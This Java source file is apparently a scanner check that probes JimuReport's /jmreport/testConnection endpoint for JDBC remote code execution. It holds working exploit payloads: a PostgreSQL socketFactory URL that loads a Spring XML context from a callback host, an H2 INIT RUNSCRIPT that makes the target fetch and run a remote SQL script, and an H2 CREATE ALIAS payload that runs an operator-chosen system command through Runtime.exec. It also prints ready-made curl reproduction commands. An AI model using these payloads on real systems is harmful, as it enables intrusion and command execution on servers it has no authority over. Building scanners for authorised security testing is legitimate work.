package com.jeescan.checks;

import com.jeescan.core.Detector;
import com.jeescan.core.Http;
import com.jeescan.core.Json;
import com.jeescan.core.Result;

/**
 * #2 JDBC RCE — POST /jmreport/testConnection
 *
 * 【POC 来源策略】
 *   主 POC = 网上公开流传的完整字段版（含 id/code/dbType/dbName/userName/dbPassword）
 *   辅助 POC = 精简 4 字段版（dbDriver/dbUrl/dbUsername/dbPassword）
 *
 *   实测两者在本类目标上响应完全一致（冗余字段不影响结果），
 *   但网上版本兼容性更好（部分版本控制器要求 id/code/dbType 非空才继续）。
 *   因此检测优先发网上全字段版，精简版作为备用/对照。
 *
 * 【三条链】
 *   a) PostgreSQL socketFactory → FileSystemXmlApplicationContext → ProcessBuilder
 *   b) H2  INIT=CREATE ALIAS / RUNSCRIPT
 *   c) MySQL 驱动存在性
 *
 * 【严格自检】
 *   判定不看 success 字段，而看【驱动是否被加载并进入连接流程】：
 *     - "驱动类不存在"            → 驱动不在 classpath，此链必然不通
 *     - "Connection refused"     → 驱动已加载并真的发起 TCP 连接
 *     - "could not be instantiated" → socketFactory 反射已执行（关键信号）
 */
public class JdbcTestConnection extends Detector {

    // ===== 网上公开 POC 的字段模板 =====
    /** 网上 POC 固定字段（与漏洞无关，但部分版本要求存在）。 */
    private static final String[] PUBLIC_POC_FIXED = {
            "id", "1",
            "code", "ABC",
            "dbType", "MySQL",
            "dbName", "383BAb7deFC825E6",
    };

    public JdbcTestConnection() {
        super("2", "testConnection JDBC RCE",
              "/jmreport/testConnection", "H2 INIT / pgsql socketFactory / mysql",
              "critical", false,
              "以'驱动是否被加载并进入连接流程'为硬判据；主用网上全字段 POC，精简版作对照");
    }

    /**
     * 用网上 POC 的全字段结构构造请求体。
     * @param driver   dbDriver
     * @param dbUrl    dbUrl
     * @param userName 用户名（网上 POC 用 userName 大写 N）
     * @param password 密码
     */
    private static String publicBody(String driver, String dbUrl,
                                     String userName, String password) {
        StringBuilder sb = new StringBuilder("{");
        for (int i = 0; i < PUBLIC_POC_FIXED.length; i += 2) {
            sb.append(Json.quote(PUBLIC_POC_FIXED[i])).append(':')
              .append(Json.quote(PUBLIC_POC_FIXED[i + 1])).append(',');
        }
        sb.append(Json.quote("dbDriver")).append(':').append(Json.quote(driver)).append(',');
        sb.append(Json.quote("dbUrl")).append(':').append(Json.quote(dbUrl)).append(',');
        sb.append(Json.quote("dbPassword")).append(':').append(Json.quote(password)).append(',');
        sb.append(Json.quote("userName")).append(':').append(Json.quote(userName));
        sb.append('}');
        return sb.toString();
    }

    /** 精简 4 字段版（辅助对照用）。 */
    private static String thinBody(String driver, String dbUrl,
                                   String user, String password) {
        return Json.obj("dbDriver", driver, "dbUrl", dbUrl,
                "dbUsername", user, "dbPassword", password);
    }

    @Override
    public Result run(Ctx ctx) {
        Result res = newResult();
        Http h = ctx.http;
        String path = ctx.p("jmreport/testConnection");
        String url = h.url(path);

        // ---------- 0. 基线：不存在的驱动，确认接口可达 ----------
        String bogusBody = publicBody("no.such.Driver." + rnd(6),
                "jdbc:x://127.0.0.1:1/x", "u", "p");
        Http.Resp bogus = h.postJson(path, bogusBody);
        res.trace("0. 基线（网上POC结构 + 不存在的驱动）", "POST", url, bogusBody, bogus,
                "接口可达性探针；预期返回'驱动类不存在'");
        if (isRst(bogus)) {
            return res.set(Result.State.ERROR, "基线被重置：" + bogus.err);
        }
        if (bogus.status <= 0) {
            return res.set(Result.State.ERROR, "接口不可达");
        }

        // ---------- 1. PostgreSQL 驱动加载（随机端口，期望 refused） ----------
        String closedPort = String.valueOf(1 + RND.nextInt(60000));
        String pgUrl = "jdbc:postgresql://127.0.0.1:" + closedPort
                + "/x?connectTimeout=3&socketTimeout=3";
        String pgBody = publicBody("org.postgresql.Driver", pgUrl, "u", "p");
        Http.Resp pg = h.postJson(path, pgBody);
        res.trace("1. PostgreSQL 驱动加载（关闭端口 " + closedPort + "）", "POST", url,
                pgBody, pg, "出现 refused = 驱动已加载并真实建连");

        boolean pgLoaded = !has(pg, "驱动类不存在") && pg.status > 0
                && (hasIgnoreCase(pg, "refused") || hasIgnoreCase(pg, "connection"));

        // ---------- 2. MySQL 驱动存在性 ----------
        String myBody = publicBody("com.mysql.jdbc.Driver", pgUrl, "u", "p");
        Http.Resp my = h.postJson(path, myBody);
        res.trace("2. MySQL 驱动存在性", "POST", url, myBody, my,
                "'驱动类不存在' = mysql 驱动不可用");
        boolean myLoaded = !has(my, "驱动类不存在") && my.status > 0;

        // ---------- 3. socketFactory 反射（RCE 关键点） ----------
        String cls = "org.springframework.context.support.FileSystemXmlApplicationContext";
        String arg = (ctx.oobUrl == null || ctx.oobUrl.isEmpty())
                ? "http://127.0.0.1:1/bean.xml" : ctx.oobUrl;
        String sfUrl = "jdbc:postgresql://127.0.0.1:5432/x?socketFactory=" + cls
                + "&socketFactoryArg=" + arg + "&connectTimeout=3&socketTimeout=3";
        String sfBody = publicBody("org.postgresql.Driver", sfUrl, "postgres", "postgres");
        Http.Resp sf = h.postJson(path, sfBody);
        res.trace("3. socketFactory 反射探针（网上POC全字段）", "POST", url, sfBody, sf,
                "could not be instantiated = 反射已执行，命令在其之前完成");

        boolean sfFired = hasIgnoreCase(sf, "could not be instantiated")
                || hasIgnoreCase(sf, "SocketFactory class provided");

        // ---------- 3b. 精简版对照（验证字段数不影响结果） ----------
        String sfThin = thinBody("org.postgresql.Driver", sfUrl, "postgres", "postgres");
        Http.Resp sf2 = h.postJson(path, sfThin);
        res.trace("3b. socketFactory 精简4字段对照", "POST", url, sfThin, sf2,
                "与 3 响应应一致，证明冗余字段无影响");
        boolean sfThinFired = hasIgnoreCase(sf2, "could not be instantiated");

        // ---------- 4. H2 驱动加载 ----------
        String h2Body = publicBody("org.h2.Driver",
                "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3", "u", "p");
        Http.Resp h2 = h.postJson(path, h2Body);
        res.trace("4. H2 驱动加载", "POST", url, h2Body, h2,
                "'驱动类不存在' = H2 不在 classpath");
        boolean h2Loaded = !has(h2, "驱动类不存在") && h2.status > 0;

        // ---------- 4b. H2 INIT 试探（无条件执行，与 pgsql socketFactory 对等） ----------
        // 用 INIT=RUNSCRIPT FROM '<OOB>/h2init-xxxx.sql'
        // 判据不看响应体，只看到 OOB 是否收到目标发来的 GET。
        // 不发任何破坏性 SQL，仅是让 H2 去拉一个我们自己托管的脚本文件。
        boolean oobProvided = ctx.oobUrl != null && !ctx.oobUrl.isEmpty();
        String h2InitUrl = null;
        boolean h2InitSuggested = false;

        if (h2Loaded) {
            String oobBase;
            if (oobProvided) {
                oobBase = ctx.oobUrl.endsWith("/")
                        ? ctx.oobUrl.substring(0, ctx.oobUrl.length() - 1) : ctx.oobUrl;
            } else {
                // 未配 OOB 时用占位域名，仍可观察目标是否报 DNS/连接类错误
                oobBase = "http://jscan-oob.invalid";
            }
            h2InitUrl = oobBase + "/h2init-" + rnd(8) + ".sql";

            String h2InitBody = publicBody("org.h2.Driver",
                    "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"
                            + h2InitUrl + "'", "u", "p");
            Http.Resp hi = h.postJson(path, h2InitBody);
            res.trace("4b. H2 INIT 试探（RUNSCRIPT FROM）", "POST", url, h2InitBody, hi,
                    "判据看 " + h2InitUrl + " 是否收到目标 HTTP 请求；"
                    + "若报 URL/IO 类错误也说明 INIT 被解析");

            // INIT 被执行的旁证：响应里出现与「拉取脚本」相关的错误，
            // 而不是「INIT 参数非法」或「驱动类不存在」
            h2InitSuggested = hasIgnoreCase(hi, "RUNSCRIPT")
                    || hasIgnoreCase(hi, "FileNotFound")
                    || hasIgnoreCase(hi, "IOException")
                    || hasIgnoreCase(hi, "Connection refused")
                    || hasIgnoreCase(hi, "unknown host")
                    || hasIgnoreCase(hi, "MalformedURL")
                    || hasIgnoreCase(hi, "Syntax error");

            res.ev("已发 H2 INIT 载荷，请核对 OOB 是否收到 GET " + h2InitUrl);
            if (h2InitSuggested) {
                res.ev("响应含 RUNSCRIPT/IO/语法类错误 —— 说明 INIT 参数已被 H2 解析");
            }
        }

        // ---------- 4c. H2 INIT 命令执行形态（需敏感操作 + OOB） ----------
        // 用 CREATE ALIAS + CALL 直接跑系统命令；只在显式勾选敏感操作时执行。
        if (h2Loaded && ctx.enableSensitive && oobProvided) {
            String cmd = ctx.cmd == null || ctx.cmd.isEmpty() ? "id" : ctx.cmd;
            String aliasUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;"
                    + "INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception "
                    + "{java.lang.Runtime.getRuntime().exec(b);}';CALL EXEC('" + cmd + "')";
            String aliasBody = publicBody("org.h2.Driver", aliasUrl, "u", "p");
            Http.Resp ali = h.postJson(path, aliasBody);
            res.trace("4c. H2 INIT 命令执行（CREATE ALIAS + CALL，敏感）", "POST", url,
                    aliasBody, ali,
                    "CREATE ALIAS 被接受即说明可执行 Java；命令 " + cmd);
            boolean aliasOk = hasIgnoreCase(ali, "CREATE ALIAS")
                    || hasIgnoreCase(ali, "ALIAS")
                    || hasIgnoreCase(ali, "Syntax error");
            if (aliasOk) {
                res.ev("H2 CREATE ALIAS 载荷已被解析（可执行 Java 代码）");
            }
        }

        // ================= 判定 =================
        boolean vuln = false;

        if (sfFired || sfThinFired) {
            vuln = true;
            res.ev("socketFactory 反射实例化已执行（响应含 could not be instantiated）");
            res.ev("该报错发生在 ProcessBuilder 执行【之后】，属正常形态");
            res.ev("RCE 最终确认看 OOB 回连：" + arg);
            if (sfFired && sfThinFired) {
                res.ev("全字段版与精简版响应一致，确认冗余字段（id/code/dbType/dbName/userName）无影响");
            }
        }
        if (pgLoaded) {
            res.ev("postgresql 驱动已加载并真实建连（端口 " + closedPort + " refused 为证）");
        }
        if (myLoaded) {
            res.ev("mysql 驱动类可加载");
        }
        if (h2Loaded) {
            res.ev("H2 驱动已加载，可打 INIT 链");
        }
        if (h2InitSuggested) {
            res.ev("H2 INIT 参数已被解析（RUNSCRIPT 生效），配合 OOB 可确认 RCE");
        }

        if (vuln) {
            // 反例：不存在的 socketFactory 类
            String negBody = publicBody("org.postgresql.Driver",
                    "jdbc:postgresql://127.0.0.1:5432/x?socketFactory=no.such.Klass"
                            + rnd(6) + "&socketFactoryArg=http://127.0.0.1:1/x.xml",
                    "u", "p");
            Http.Resp neg = h.postJson(path, negBody);
            res.trace("5. 反例（不存在的 socketFactory 类）", "POST", url, negBody, neg,
                    "若与正例回显相同，则该报错不能区分类存在与否");
            boolean negSame = hasIgnoreCase(neg, "could not be instantiated");

            if (negSame) {
                res.ev("不存在的类也返回同样报错 —— 该报错【不能】证明指定类存在");
                res.ev("可确认：socketFactory 参数被 pgjdbc 反射处理（利用面成立）");
                if (oobProvided) {
                    res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                            + sfBody + "'");
                    res.repro("# 去 " + arg + " 看回连，有回连才是 RCE");
                    return res.set(Result.State.MAYBE,
                            "socketFactory 反射面已确认，需核对 OOB 回连 " + arg);
                }
                return res.set(Result.State.MAYBE,
                        "socketFactory 参数被反射处理（利用面存在），未配 OOB 无法确认 gadget");
            }

            res.ev("反例不复现同款报错，说明指定类被单独解析（gadget 可用）");
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '"
                    + sfBody + "'");
            return res.set(Result.State.VULN,
                    "pgjdbc socketFactory 反射链可加载指定类，最终确认看 OOB " + arg);
        }

        if (pgLoaded || h2Loaded || myLoaded) {
            StringBuilder v = new StringBuilder("驱动可加载但 RCE 链未触发");
            if (h2Loaded && !oobProvided) {
                v.append("；H2 驱动可用且已发 INIT 试探，但未填「回连地址」无法验证是否执行");
            }
            if (h2Loaded && oobProvided) {
                v.append("；H2 驱动可用，已发 INIT 试探，请核对 OOB " + h2InitUrl);
            }
            if (h2Loaded && !ctx.enableSensitive) {
                v.append("；勾选「敏感操作」可加测 H2 CREATE ALIAS 命令执行形态");
            }
            return res.set(Result.State.MAYBE, v.toString());
        }

        return res.set(Result.State.SAFE, "未检测到可用 JDBC 驱动");
    }
}
